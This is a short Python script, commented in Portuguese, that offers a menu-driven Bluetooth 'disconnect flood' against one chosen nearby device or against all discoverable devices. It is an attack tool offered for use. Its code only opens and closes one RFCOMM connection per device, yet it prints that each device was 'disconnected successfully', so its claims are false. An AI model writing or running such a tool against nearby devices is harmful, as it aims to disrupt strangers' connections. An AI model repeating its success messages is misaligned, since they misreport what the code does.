import bluetooth
import socket

# Obtém o endereço IP do dispositivo automaticamente
def get_device_ip():
    device_ip = socket.gethostbyname(socket.gethostname())
    return device_ip

# Realiza o "flood" de solicitações de desconexão para um dispositivo específico
def flood_disconnect_single(device_address):
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.connect((device_address, 1))
        sock.close()
        print(f"Dispositivo {device_address} desconectado com sucesso.")
    except Exception as e:
        print(f"Erro ao desconectar dispositivo {device_address}: {str(e)}")

# Realiza o "flood" de solicitações de desconexão para todos os dispositivos próximos
def flood_disconnect_all():
    nearby_devices = bluetooth.discover_devices()
    for device_address in nearby_devices:
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.connect((device_address, 1))
            sock.close()
            print(f"Dispositivo {device_address} desconectado com sucesso.")
        except Exception as e:
            print(f"Erro ao desconectar dispositivo {device_address}: {str(e)}")

# Função para exibir o menu de escolha
def exibir_menu():
    print("Menu:")
    print("1. Realizar o flood de desconexão em um dispositivo específico")
    print("2. Realizar o flood de desconexão em todos os dispositivos próximos")
    print("0. Sair")

# Loop principal do programa
while True:
    exibir_menu()
    escolha = input("Escolha uma opção: ")

    if escolha == "1":
        nearby_devices = bluetooth.discover_devices()
        print("Dispositivos próximos:")
        for i, device_address in enumerate(nearby_devices):
            device_name = bluetooth.lookup_name(device_address)
            print(f"{i+1}. {device_name} ({device_address})")
        
        device_choice = int(input("Escolha o número do dispositivo para realizar o flood: "))
        if device_choice >= 1 and device_choice <= len(nearby_devices):
            device_address = nearby_devices[device_choice-1]
            flood_disconnect_single(device_address)
        else:
            print("Escolha inválida. Por favor, escolha um número válido.")

    elif escolha == "2":
        flood_disconnect_all()

    elif escolha == "0":
        break

    else:
        print("Opção inválida. Por favor, escolha uma opção válida.")

# Obtém o endereço IP do dispositivo
device_ip = get_device_ip()
print("Endereço IP do dispositivo:", device_ip)
